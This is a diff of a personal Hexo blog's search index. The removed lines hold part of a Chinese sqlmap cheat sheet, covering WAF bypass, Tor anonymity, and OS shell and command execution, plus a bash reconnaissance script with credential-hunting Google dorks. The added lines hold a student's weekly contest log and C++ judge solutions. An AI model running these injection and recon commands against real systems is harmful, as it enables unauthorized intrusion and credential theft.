class="line">sqlmap.py -u “http://” –data “tfUName=12345&amp;tfUPass=12345” –tables -D “数据库名” ==列表</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “http://” –data “tfUName=12345&amp;tfUPass=12345” –columns -T “表名” -D “数据库名” ==暴字段</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “http://” –data “tfUName=12345&amp;tfUPass=12345” –dump –columns -C “字段,字段” -T “表” -D “数据名” ==暴字段内容</span><br><span class="line"></span><br><span class="line">伪静态注入</span><br><span class="line">注入点：http://.html （注意：要加个* 哪里存在注入就加上 * 号）</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://*.html –dbs ==获取数据库名</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://*.html –tables -D “数据名” ==获取数据库当中的表</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://*.html –columns -D “数据名” -T “表名” ==获取数据库的表中的字段</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://*.html –dump -D “数据名” -T “表名” -C “字段,字段” ==获取数据库的表中的字段内容</span><br><span class="line"></span><br><span class="line">绕过防火墙注入</span><br><span class="line">确认是否开了WAF</span><br><span class="line">Sqlmap -u “注入点” –thread 10 –identify-waf (首选)</span><br><span class="line">sqlmap -u “注入点” –thread 10 –check-waf 备选</span><br><span class="line">使用参数绕过</span><br><span class="line">Sqlmap -u “注入点” –random-agent -v 2 （浏览器绕过）</span><br><span class="line">Sqlmap -u “注入点” –hpp -v 3 (参数污染绕过)</span><br><span class="line">Sqlmap -u “注入点” –delay=3.5 –time-sec=60</span><br><span class="line">Sqlmap -u “注入点” –proxy=211.211.211.211.8080 –proxy-cred=211.:985 代理注入</span><br><span class="line">sqlmap -u “注入点” –ignore-proxy 禁止用代理注入，直接注入</span><br><span class="line">sqlmap -u “注入点” –flush-session 清空会话，重构注入</span><br><span class="line">sqlmap -u “注入点” -hex 或者–no-cast 进行字符码转换</span><br><span class="line">sqlmap -u “注入点” –mobile 对移动端的服务器进行注入</span><br><span class="line">sqlmap -u “注入点” –tor 匿名注入</span><br><span class="line"></span><br><span class="line">直接拿shell或者执行命令（需要权限很大跟物理路径）</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url –os-shell</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url –os-cmd=ipconfig</span><br><span class="line"></span><br><span class="line">请求延时（一般突破防火墙）</span><br><span class="line"></span><br><span class="line">第一种方法：sqlmap.py -u url –delay 2 （注意：2是两秒的意思，也就是说2秒访问一次）</span><br><span class="line">第二种方法： sqlmap.py -u url –safe-freq 3 （注意：3是3次的意思。。）</span><br><span class="line"></span><br><span class="line">可以组合使用 sqlmap.py -u url –delay 2 –safe-freq 3</span><br><span class="line"></span><br><span class="line">测试注入点权限：</span><br><span class="line">sqlmap -u url –privileges</span><br><span class="line"></span><br><span class="line">执行shell命令命令</span><br><span class="line">sqlmap -u url –os-cmd=”net user” //执行netuser命令</span><br><span class="line">sqlmap -u url –os-shell //系统交互的shell</span><br><span class="line">————————————————</span><br></pre></td></tr></table></figure>
-<p><a href="https://hackmd.io/@bttea/sqlmap_common_parameters">https://hackmd.io/@bttea/sqlmap_common_parameters</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">if [ $# -ne 1 ];then</span><br><span class="line">    echo &quot;Usage: $0 &lt;target&gt;&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">target=$1</span><br><span class="line">mkdir -p recon-$target</span><br><span class="line">cd recon-$target</span><br><span class="line">echo &quot;[*] 正在初始化偵查目標: $target&quot;</span><br><span class="line"></span><br><span class="line"># 1. Whois / DNS 基本資料搜集</span><br><span class="line">echo &quot;[*] Whois資訊搜集...&quot;</span><br><span class="line">whois $target &gt; whois.txt</span><br><span class="line"></span><br><span class="line">echo &quot;[*] DNS資訊搜集...&quot;</span><br><span class="line">dig $target any &gt; dig_any.txt</span><br><span class="line">dig $target mx &gt; dig_mx.txt</span><br><span class="line">dig $target txt &gt; dig_txt.txt</span><br><span class="line">host -a $target &gt; host.txt</span><br><span class="line">nslookup $target &gt; nslookup.txt</span><br><span class="line"></span><br><span class="line"># 2. 子域名搜集（Kali內建）</span><br><span class="line">echo &quot;[*] 子域名收集(dnsenum+fierce+dnsrecon)...&quot;</span><br><span class="line">dnsenum $target -o dnsenum.xml</span><br><span class="line">fierce --domain $target &gt; fierce.txt</span><br><span class="line">dnsrecon -d $target -a &gt; dnsrecon.txt</span><br><span class="line"></span><br><span class="line"># 3. theHarvester 整合收集Email/帳號/子域</span><br><span class="line">echo &quot;[*] theHarvester收集Email/帳號...&quot;</span><br><span class="line">theHarvester -d $target -b all -f theharvester.html</span><br><span class="line"></span><br><span class="line"># 4. 技術棧分析 (whatweb+curl頭部)</span><br><span class="line">echo &quot;[*] 技術棧分析...&quot;</span><br><span class="line">whatweb -v $target &gt; whatweb.txt</span><br><span class="line">curl -I http://$target &gt; curl_headers.txt</span><br><span class="line"></span><br><span class="line"># 5. Nmap大範圍掃描</span><br><span class="line">echo &quot;[*] Nmap完整掃描...&quot;</span><br><span class="line">nmap -sS -sV -p- -v -T4 $target -oA nmap_fullscan</span><br><span class="line"></span><br><span class="line">echo &quot;[*] Nmap HTTP相關漏洞掃描...&quot;</span><br><span class="line">timeout 60 nmap --script=http-enum,http-vuln* -p 80,443 $target -oA nmap_http_enum</span><br><span class="line"></span><br><span class="line"># 6. HTTP Method測試</span><br><span class="line">echo &quot;[*] HTTP Method探測...&quot;</span><br><span class="line">curl -X OPTIONS -I http://$target &gt; http_methods.txt</span><br><span class="line"></span><br><span class="line"># 7. 爆破目錄與檔案 (gobuster/dirb/wfuzz)</span><br><span class="line">echo &quot;[*] gobuster目錄爆破...&quot;</span><br><span class="line">gobuster dir -u http://$target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx,jsp,php,html,txt,zip,bak,tar.gz -t 50 &gt; gobuster.txt</span><br><span class="line"></span><br><span class="line">echo &quot;[*] dirb目錄爆破...&quot;</span><br><span class="line">dirb http://$target /usr/share/wordlists/dirb/common.txt &gt; dirb.txt</span><br><span class="line"></span><br><span class="line">echo &quot;[*] wfuzz爆破...&quot;</span><br><span class="line">wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://$target/FUZZ &gt; wfuzz.txt</span><br><span class="line"></span><br><span class="line"># 8. Google Hacking提示</span><br><span class="line">echo &quot;[*] Google Hacking建議語法，請手動搜尋:&quot;</span><br><span class="line">echo &quot;----------------------------------------&quot;</span><br><span class="line">echo &quot;site:$target ext:sql | ext:bak | ext:old | ext:backup&quot;</span><br><span class="line">echo &quot;site:$target intitle:\&quot;index of\&quot;&quot;</span><br><span class="line">echo &quot;site:$target inurl:\&quot;admin\&quot; | \&quot;login\&quot;&quot;</span><br><span class="line">echo &quot;site:$target inurl:\&quot;upload\&quot; | \&quot;submit\&quot;&quot;</span><br><span class="line">echo &quot;site:$target ext:xml | ext:json | ext:conf | ext:env | ext:jsp&quot;</span><br><span class="line">echo &quot;site:$target \&quot;Warning\&quot; | \&quot;Fatal error\&quot; | \&quot;unexpected token\&quot;&quot;</span><br><span class="line">echo &quot;site:$target \&quot;phpinfo()\&quot;&quot;</span><br><span class="line">echo &quot;site:$target \&quot;DB_PASSWORD\&quot; | \&quot;AWS_SECRET_ACCESS_KEY\&quot;&quot;</span><br><span class="line">echo &quot;cache:$target&quot;</span><br><span class="line">echo &quot;site:$target filetype:pdf | filetype:docx&quot;</span><br><span class="line">echo &quot;site:$target \&quot;Apache Tomcat\&quot; | \&quot;Jenkins\&quot; | \&quot;Confluence\&quot;&quot;</span><br><span class="line">echo &quot;----------------------------------------&quot;</span><br><span class="line"></span><br><span class="line"># 9. 歷史資料蒐集</span><br><span class="line">echo &quot;[*] 手動挖掘Archive歷史頁面，嘗試存取Wayback Machine...&quot;</span><br><span class="line">curl &quot;http://web.archive.org/cdx/search/cdx?url=$target/*&amp;output=text&amp;fl=original&quot; &gt; archive_urls.txt</span><br><span class="line"></span><br><span class="line"># 10. SSL掃描</span><br><span class="line">echo &quot;[*] SSL弱點掃描...&quot;</span><br><span class="line">sslscan $target &gt; sslscan.txt</span><br><span class="line"></span><br><span class="line"># 11. 旁站偵測</span><br><span class="line">echo &quot;[*] 旁站偵測(http-vhosts)...&quot;</span><br><span class="line">nmap --script=http-vhosts -p 80 $target -oA vhost_enum</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 偵查完成，所有資料已經收集！&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><a href="https://otx.alienvault.com/indicator/ip/210.69.167.102">https://otx.alienvault.com/indicator/ip/210.69.167.102</a></p>
-]]></content>
+<h1 id="Week-4-4-7-4-13"><a href="#Week-4-4-7-4-13" class="headerlink" title="Week 4(4&#x2F;7~4&#x2F;13)"></a>Week 4(4&#x2F;7~4&#x2F;13)</h1><ul>
+<li>Programming Contest<ul>
+<li>AI CUP <ul>
+<li>big problem@@</li>
+</ul>
+</li>
+<li>HSPC 2024<ul>
+<li>rk 54&#x2F;180 30%</li>
+<li>grade 348&#x2F;900</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Programming language<ul>
+<li>C++ (CSES)</li>
+</ul>
+</li>
+<li>Read<ul>
+<li>Murphy’s Law</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="Week-5-4-14-4-20"><a href="#Week-5-4-14-4-20" class="headerlink" title="Week 5(4&#x2F;14~4&#x2F;20)"></a>Week 5(4&#x2F;14~4&#x2F;20)</h1><ul>
+<li>Programming Contest<ul>
+<li>AI CUP</li>
+</ul>
+</li>
+<li>Programming language<ul>
+<li>C++ (CSES)</li>
+</ul>
+</li>
+<li>Read</li>
+<li>Study <ul>
+<li>Machine Learning</li>
+<li>Calculus</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="Week-6-4-21-4-27"><a href="#Week-6-4-21-4-27" class="headerlink" title="Week 6(4&#x2F;21~4&#x2F;27)"></a>Week 6(4&#x2F;21~4&#x2F;27)</h1><ul>
+<li><em>School final exam</em></li>
+<li>Programming Contest<ul>
+<li>CPE<ul>
+<li>rk 595&#x2F;2667 22%</li>
+<li>grade 2&#x2F;7</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Read</li>
+<li>Study <ul>
+<li>CH, EN</li>
+<li>Calculus, Complex number</li>
+</ul>
+</li>
+<li>CTF<ul>
+<li>THJCC CTF<ul>
+<li>rk 145&#x2F;328 42%</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="Week-7-4-28-5-4"><a href="#Week-7-4-28-5-4" class="headerlink" title="Week 7(4&#x2F;28~5&#x2F;4)"></a>Week 7(4&#x2F;28~5&#x2F;4)</h1><ul>
+<li><em>g0v Summit 2024 😍😍</em><ul>
+<li>交超多朋友 好愛</li>
+<li><a href="https://chewu-0319.github.io/personal/g0vsummit/" style="color: #0066CC;">心得+內容</a></li>
+</ul>
+</li>
+<li>Programming language<ul>
+<li>C++ (CSES)</li>
+</ul>
+</li>
+<li>Programming Contest<ul>
+<li>Codeforces</li>
+</ul>
+</li>
+<li>AITC(~5&#x2F;5)</li>
+<li>YTP 找隊友</li>
+</ul>
+<hr>
+<h1 id="Week-8-5-5-5-11"><a href="#Week-8-5-5-5-11" class="headerlink" title="Week 8(5&#x2F;5~5&#x2F;11)"></a>Week 8(5&#x2F;5~5&#x2F;11)</h1><ul>
+<li>Programming Contest<ul>
+<li>Codeforces</li>
+</ul>
+</li>
+<li>YTP 找到隊友了!</li>
+<li>Prepare CTF<ul>
+<li>AIS3 pre-exam</li>
+</ul>
+</li>
+<li>Social Designer<ul>
+<li>survey</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="Week-9-5-12-5-18"><a href="#Week-9-5-12-5-18" class="headerlink" title="Week 9(5&#x2F;12~5&#x2F;18)"></a>Week 9(5&#x2F;12~5&#x2F;18)</h1><ul>
+<li><em>2024 CYBERSEC臺灣資安大會</em></li>
+<li>Prepare CTF<ul>
+<li>AIS3 pre-exam</li>
+<li>Take information security class</li>
+</ul>
+</li>
+<li>Social Designer<ul>
+<li>Analyze and write plans</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="Week-10-5-19-5-25"><a href="#Week-10-5-19-5-25" class="headerlink" title="Week 10(5&#x2F;19~5&#x2F;25)"></a>Week 10(5&#x2F;19~5&#x2F;25)</h1><ul>
+<li><em>AIS3 pre-exam</em></li>
+<li>Get exposed to <em>cryptocurrencies</em></li>
+<li>Programming Contest<ul>
+<li>CPE</li>
+</ul>
+</li>
+<li>AIS3 pre-exam <ul>
+<li>rk 145&#x2F;328 44%</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="Week-11-5-26-6-1"><a href="#Week-11-5-26-6-1" class="headerlink" title="Week 11(5&#x2F;26~6&#x2F;1)"></a>Week 11(5&#x2F;26~6&#x2F;1)</h1><ul>
+<li><em>畢業晚會</em></li>
+<li>cryptocurrencies API BOT</li>
+<li>Relax</li>
+<li>Programming language<ul>
+<li>C++</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="Week-12-6-2-6-8"><a href="#Week-12-6-2-6-8" class="headerlink" title="Week 12(6&#x2F;2~6&#x2F;8)"></a>Week 12(6&#x2F;2~6&#x2F;8)</h1><ul>
+<li><em>畢業典禮</em>  &#x2F; <em>錄取AI人才培育計畫</em></li>
+<li>Relax</li>
+</ul>
+<hr>
+<h1 id="Week-13-6-9-6-15"><a href="#Week-13-6-9-6-15" class="headerlink" title="Week 13(6&#x2F;9~6&#x2F;15)"></a>Week 13(6&#x2F;9~6&#x2F;15)</h1><ul>
+<li><em>機車(白沙灣)</em> &#x2F; <em>讀高中生論文</em></li>
+<li>Prepare APCS </li>
+<li>APP (week2)<ul>
+<li>Still searching for a reasonable UI&#x2F;UX</li>
+</ul>
+</li>
+<li>Programming language<ul>
+<li>C++</li>
+</ul>
+</li>
+<li>Relax</li>
+</ul>
+<hr>
+<h1 id="Week-14-6-16-6-22"><a href="#Week-14-6-16-6-22" class="headerlink" title="Week 14(6&#x2F;16~6&#x2F;22)"></a>Week 14(6&#x2F;16~6&#x2F;22)</h1><ul>
+<li><em>APCS</em> &#x2F; <em>新竹煙波飯店</em></li>
+<li>APP (week3)<ul>
+<li>UI&#x2F;UX</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="Week-15-6-23-6-29"><a href="#Week-15-6-23-6-29" class="headerlink" title="Week 15(6&#x2F;23~6&#x2F;29)"></a>Week 15(6&#x2F;23~6&#x2F;29)</h1><ul>
+<li><em>AI培訓-第一次面談</em> &#x2F; <em>市政府領獎</em> </li>
+<li>APCS 4&#x2F;3 😍</li>
+</ul>
+<hr>
+<h1 id="Week-16-6-30-7-6"><a href="#Week-16-6-30-7-6" class="headerlink" title="Week 16(6&#x2F;30~7&#x2F;6)"></a>Week 16(6&#x2F;30~7&#x2F;6)</h1><ul>
+<li><em>成大找教授</em> &#x2F; <em>LLM課程</em></li>
+</ul>
+<hr>
+<h1 id="Week-17-7-7-7-13"><a href="#Week-17-7-7-7-13" class="headerlink" title="Week 17(7&#x2F;7~7&#x2F;13)"></a>Week 17(7&#x2F;7~7&#x2F;13)</h1><ul>
+<li><em>HITCON工人見面</em> </li>
+<li>AIS3錄取啦!😍</li>
+</ul>
+<hr>
+<h1 id="Week-18-7-14-7-20"><a href="#Week-18-7-14-7-20" class="headerlink" title="Week 18(7&#x2F;14~7&#x2F;20)"></a>Week 18(7&#x2F;14~7&#x2F;20)</h1><ul>
+<li><em>social designer複賽</em></li>
+</ul>
+<hr>
+<h1 id="Week-19-7-21-7-27"><a href="#Week-19-7-21-7-27" class="headerlink" title="Week 19(7&#x2F;21~7&#x2F;27)"></a>Week 19(7&#x2F;21~7&#x2F;27)</h1><ul>
+<li><em>YTP</em> &#x2F; <em>颱風超大</em></li>
+</ul>
+<hr>
+<h1 id="Week-20-7-28-8-3"><a href="#Week-20-7-28-8-3" class="headerlink" title="Week 20(7&#x2F;28~8&#x2F;3)"></a>Week 20(7&#x2F;28~8&#x2F;3)</h1><ul>
+<li><em>AIS3</em></li>
+</ul>
+<hr>
+<h1 id="Goal-for-next-week"><a href="#Goal-for-next-week" class="headerlink" title="Goal for next week"></a>Goal for next week</h1><hr>
+<!-- Start of CuterCounter Code -->
+<p><a href="https://www.cutercounter.com/traditional-chinese-nn/" target="_blank" style="pointer-events: none;"><img src="https://www.cutercounter.com/hits.php?id=hmxpacfo&nd=6&style=11" border="0" alt="網站計數器"></a></p>
+<!-- End of CuterCounter Code -->]]></content>
       <categories>
-        <category>資安</category>
+        <category>紀錄</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>日常刷題</title>
+    <url>/zj-code/</url>
+    <content><![CDATA[<p>有空再更新</p>
+<h2 id="m370"><a href="#m370" class="headerlink" title="m370"></a>m370</h2><details>
+  <summary>
+    <span style="font-weight:bold;font-size:22px">code</span>
+    <span style="color:green;font-weight:bold; font-size:22px"> AC(3ms, 352KB)</span>
+  </summary>
+
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="type">int</span> x,n,a,l=<span class="number">0</span>,r=<span class="number">0</span>,mn=<span class="number">105</span>,mx=<span class="number">-105</span>;</span><br><span class="line">	cin&gt;&gt;x&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">		cin&gt;&gt;a;</span><br><span class="line">		<span class="keyword">if</span>(a&gt;x) r++,mx=<span class="built_in">max</span>(mx,a);</span><br><span class="line">		<span class="keyword">else</span> l++,mn=<span class="built_in">min</span>(mn,a);</span><br><span class="line">	&#125;</span><br><span class="line">	(l&gt;r)?cout&lt;&lt;l&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;mn:cout&lt;&lt;r&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;mx;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</details>
+
+<hr>
+<h2 id="m931"><a href="#m931" class="headerlink" title="m931"></a>m931</h2><details>
+  <summary>
+    <span style="font-weight:bold;font-size:22px">code</span>
+    <span style="color:green;font-weight:bold; font-size:22px"> AC(2ms, 364KB)</span>
+  </summary>
+  
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> n,mx=<span class="number">0</span>,tmp=<span class="number">0</span>;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; v;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    v.<span class="built_in">resize</span>(<span class="number">3</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;v[<span class="number">0</span>][i]&gt;&gt;v[<span class="number">1</span>][i];</span><br><span class="line">        v[<span class="number">2</span>][i]=(v[<span class="number">0</span>][i])*(v[<span class="number">0</span>][i])+(v[<span class="number">1</span>][i])*(v[<span class="number">1</span>][i]);</span><br><span class="line">        <span class="keyword">if</span>(v[<span class="number">2</span>][i]&gt;mx) mx=v[<span class="number">2</span>][i],tmp=i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">2</span>][tmp]=<span class="number">0</span>,mx=<span class="number">0</span>,tmp=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(v[<span class="number">2</span>][i]&gt;mx) mx=v[<span class="number">2</span>][i],tmp=i;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;v[<span class="number">0</span>][tmp]&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;v[<span class="number">1</span>][tmp];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</details>
+
+<hr>
+<h2 id="m932"><a href="#m932" class="headerlink" title="m932"></a>m932</h2><details>
+  <summary>
+    <span style="font-weight:bold;font-size:22px">code</span>
+    <span style="color:green;font-weight:bold; font-size:22px"> AC(2ms, 368KB)</span>
+  </summary>
+  
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);cin.<span class="built_in">tie</span>(<span class="number">0</span>); <span class="comment">//IO優化</span></span><br><span class="line">    vector&lt;vector&lt;<span class="type">char</span>&gt;&gt; v; </span><br><span class="line">    <span class="type">bool</span> t[<span class="number">123</span>]=&#123;<span class="number">0</span>&#125;;    <span class="comment">//統計用陣列 (輸出第二行時用的到)</span></span><br><span class="line">    <span class="type">int</span> m,n,k,d;        <span class="comment">//m,n,k為題目敘述 d代表的是input最後一行的整數</span></span><br><span class="line">    string s;</span><br><span class="line">    cin&gt;&gt;m&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="type">int</span> nowx=m<span class="number">-1</span>,nowy=<span class="number">0</span>,cnt=<span class="number">0</span>;      <span class="comment">//nowx,nowy記錄現在位置的x和y cnt記錄種類</span></span><br><span class="line">    v.<span class="built_in">resize</span>(m,<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;(n));    <span class="comment">//動態開記憶體</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;           <span class="comment">//把string丟進char陣列裡</span></span><br><span class="line">        cin&gt;&gt;s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">            v[i][j]=s[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">                              </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;k;i++)&#123;    <span class="comment">//先判斷現在往哪個方向 再判斷if(沒超過邊界)就更新現在位置;</span></span><br><span class="line">        cin&gt;&gt;d;</span><br><span class="line">        <span class="keyword">if</span>(d==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((nowx<span class="number">-1</span>)&gt;=<span class="number">0</span>) nowx--; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(d==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((nowy<span class="number">+1</span>)&lt;n) nowy++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(d==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((nowx<span class="number">+1</span>)&lt;m&amp;&amp;(nowy<span class="number">+1</span>)&lt;n) nowx++,nowy++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(d==<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((nowx<span class="number">+1</span>)&lt;m) nowx++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(d==<span class="number">4</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((nowy<span class="number">-1</span>)&gt;=<span class="number">0</span>) nowy--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(d==<span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((nowx<span class="number">-1</span>)&gt;=<span class="number">0</span>&amp;&amp;(nowy<span class="number">-1</span>)&gt;=<span class="number">0</span>) nowx--,nowy--;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;v[nowx][nowy]; </span><br><span class="line">        t[(<span class="type">int</span>)(v[nowx][nowy])]=<span class="number">1</span>;     <span class="comment">//這邊使用ASCII 轉成int 丟到陣列</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="string">&#x27;A&#x27;</span>;i&lt;=<span class="string">&#x27;Z&#x27;</span>;i++)&#123;         <span class="comment">//跑陣列 統計多少種類</span></span><br><span class="line">        <span class="keyword">if</span>(t[i]==<span class="number">1</span>) cnt++;        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="string">&#x27;a&#x27;</span>;i&lt;=<span class="string">&#x27;z&#x27;</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(t[i]==<span class="number">1</span>) cnt++;        </span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;\n&quot;</span>&lt;&lt;cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</details>
+
+<hr>
+<!-- Start of CuterCounter Code -->
+<p><a href="https://www.cutercounter.com/traditional-chinese-nn/" target="_blank" style="pointer-events: none;"><img src="https://www.cutercounter.com/hits.php?id=hvxocncq&nd=6&style=11" border="0" alt="網頁計數器"></a></p>
+<!-- End of CuterCounter Code -->]]></content>
+      <categories>
+        <category>zerojudge</category>
       </categories>
   </entry>
 </search>
